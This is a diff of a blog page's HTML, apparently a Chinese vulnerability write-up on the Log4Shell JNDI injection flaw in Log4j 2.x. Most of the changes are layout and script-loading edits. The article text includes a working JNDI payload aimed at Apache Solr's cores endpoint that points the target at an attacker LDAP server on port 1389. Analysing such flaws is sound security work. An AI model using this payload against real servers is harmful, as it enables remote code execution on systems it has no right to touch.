@@ -438,15 +438,15 @@ Log4j 2.x 版本在 2021 年发现了一个严重的 JNDI 注入漏洞（CVE-202
         </div>
         <hr class="clearfix">
 
-        <!-- 是否加载使用自带的 prismjs.
-        <link rel="stylesheet" href="/libs/prism/prism.min.css"> -->
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.min.css">
 
-        <!-- 
-         -->
 
-        <div class="card-content article-card-content">
-            <div id="articleContent">
-                <h3 id="Log4j-2-x"><a href="#Log4j-2-x" class="headerlink" title="Log4j 2.x:"></a><strong>Log4j 2.x</strong>:</h3><ul>
+        
+
+                <div class="card-content article-card-content">
+                    <div id="articleContent">
+                        <h3 id="Log4j-2-x"><a href="#Log4j-2-x" class="headerlink" title="Log4j 2.x:"></a><strong>Log4j 2.x</strong>:</h3><ul>
 <li>Log4j 2.x 版本在 2021 年发现了一个严重的 JNDI 注入漏洞（CVE-2021-44228），也称为 Log4Shell 漏洞。该漏洞允许攻击者通过 JNDI 查找恶意代码来远程执行代码，影响范围广泛。这个漏洞在 Log4j 2.0 到 2.14.1 版本中存在，并已在 2.15.0 及后续版本中得到修复</li>
 </ul>
 <p>Apache log4j是Apache的一个开源项目，Apache log4j 2是一个就Java的日志记录工具。通过重写了log4j框架，并且引入了大量丰富的特性，可以控制日志信息输送的目的地为控制台、文件、GUI组建等，被应用于业务系统开发，用于记录程序输入输出日志信息。log4j2中存在<strong>JNDI注入漏洞</strong>，当程序记录用户输入的数据时，即可触发该漏洞。成功利用该漏洞可在目标服务器上执行任意代码</p>
@@ -542,11 +542,11 @@ Log4j 2.x 版本在 2021 年发现了一个严重的 JNDI 注入漏洞（CVE-202
 <p>这个可以直接确定ldap端口和ldap响应的url<br><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240814225636.png" alt="image.png"><br>我们必须在class文件中省略 class后缀只能用#名字<br>Listening on 0.0.0.0:1389<br>已经启动此时我们需要直接触发链条</p>
 <h4 id="payload"><a href="#payload" class="headerlink" title="***payload"></a>***payload</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/solr/admin/cores?action=$&#123;jndi:ldap://127.0.0.1:1389&#125;</span><br></pre></td></tr></table></figure>
 
-                    
-            </div>
-            <hr />
+                            
+                    </div>
+                    <hr />
 
-            
+                    
 
     <div class="reprint" id="reprint-statement">
         
@@ -600,23 +600,23 @@ Log4j 2.x 版本在 2021 年发现了一个严重的 JNDI 注入漏洞（CVE-202
 
 
 
-                <div class="tag_share" style="display: block;">
-                    <div class="post-meta__tag-list" style="display: inline-block;">
-                        
-                            <div class="article-tag">
+                        <div class="tag_share" style="display: block;">
+                            <div class="post-meta__tag-list" style="display: inline-block;">
                                 
-                                    <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
-                                        <span class="chip bg-color">
-                                            漏洞分析
-                                        </span>
-                                    </a>
+                                    <div class="article-tag">
+                                        
+                                            <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
+                                                <span class="chip bg-color">
+                                                    漏洞分析
+                                                </span>
+                                            </a>
+                                            
+                                    </div>
                                     
                             </div>
-                            
-                    </div>
-                    <div class="post_share"
-                        style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
-                        <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+                            <div class="post_share"
+                                style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                                <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
 <div id="article-share">
 
     
@@ -628,10 +628,10 @@ Log4j 2.x 版本在 2021 年发现了一个严重的 JNDI 注入漏洞（CVE-202
 
 </div>
 
-                    </div>
+                            </div>
+                        </div>
+                        
                 </div>
-                
-        </div>
     </div>
 
     
@@ -760,20 +760,23 @@ Log4j 2.x 版本在 2021 年发现了一个严重的 JNDI 注入漏洞（CVE-202
 <script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
 
 
+  <!-- 是否加载使用自带的 prismjs. -->
+  <script type="text/javascript" src="/libs/prism/prism.min.js"></script>
+  
 
-<!-- 代码语言 -->
+    <!-- 代码语言 -->
+    
 
+        <!-- 代码块复制 -->
+        
+          <script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+          
 
-<!-- 代码块复制 -->
-
-<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
-
-
-<!-- 代码块收缩 -->
-
-<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
-
-
+            <!-- 代码块收缩 -->
+            
+              <script type="text/javascript"
+                src="/libs/codeBlock/codeShrink.js"></script>
+              
     </div>
     <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
         <div class="toc-widget card" style="background-color: white;">
@@ -879,7 +882,7 @@ Log4j 2.x 版本在 2021 年发现了一个严重的 JNDI 注入漏洞（CVE-202
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">125.3k</span>
+                        class="white-color">125.5k</span>
             
             
             
